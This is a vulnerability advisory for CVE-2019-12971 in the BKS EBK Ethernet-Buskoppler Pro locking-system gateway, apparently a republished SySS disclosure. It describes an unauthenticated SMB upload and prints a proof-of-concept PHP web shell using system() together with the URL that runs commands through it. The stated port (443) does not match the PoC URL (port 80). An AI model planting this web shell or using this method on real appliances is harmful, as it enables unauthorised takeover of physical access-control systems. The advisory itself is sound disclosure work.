@@ -1,0 +1,79 @@
+id: 32951
+date: 07/03/2019
+title: BKS EBK Ethernet-Buskoppler Pro Shell Upload Vulnerability
+author: Sebastian Auwaerter
+cves: CVE-2019-12971
+
+Product: BKS EBK Ethernet-Buskoppler Pro
+Manufacturer: BKS GmbH
+Affected Version(s): < 3.01
+Vulnerability Type: Unrestricted Upload of File with Dangerous Type (CWE-434) 
+Risk Level: High
+Solution Status: Fixed
+Manufacturer Notification: April 23, 2019
+Solution Date: June 14, 2019
+Public Disclosure: July 03, 2019
+CVE Reference: CVE-2019-12971
+Author of Advisory: Sebastian Auwaerter, SySS GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+The "EBK Ethernet-Buskoppler Pro" appliance provided by BKS GmbH is a
+gateway to communicate with the access terminals of BKS locking systems.
+The appliance is generally attached to a company's IP-based network and
+communicates with the locking systems via a proprietary bus system.
+
+Due to an unauthenticated upload functionality through Samba, the BKS
+Ethernet-Buskoppler Pro is vulnerable to remote code execution.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+An unauthenticated attacker can connect to an Ethernet-Buskoppler Pro
+using any client that supports uploading files via SMB (e.g. smbclient,
+Nautilus, Windows Explorer) and overwrite files located in the web root
+directory of the appliance. After adding a web shell to any of the
+existing PHP scripts, the attacker can execute it by accessing the
+edited script via the web server listening on the TCP port 443.
+
+According to BKS, only Appliances based on a Raspberry Pi 3 are affected
+since the vulnerability has been introduced during an upgrade from
+Raspberry Pi 2 to 3.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+As proof-of-concept, the file index.php can be altered via SMB
+(e.g. gedit smb://<VULNERABLE_HOST>/webinterface/index.php) to allow a 
+web shell in the context of the user account www-data:
+
+- ----------------
+index.php:
+<?php 
+
+if ($_REQUEST['pw'] === "very-secure-password"){
+  system($_REQUEST['cmd']);
+}
+set_include_path('/var/www/ebkpro_website');
+include 'include/debug.php';
+[...]
+- ----------------
+
+The web shell can then be used to execute commands by navigating to the
+following URL:
+
+http://<VULNERABLE_HOST>:80/index.php?pw=very-secure-password&cmd=<COMMAND>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+BKS provides update packages for the EBK Ethernet-Buskoppler. The updater
+in version 1.2.1.2 contains firmware version 3.01 which fixes the
+vulnerability.
+
+#  0day.today [2023-03-22]  #
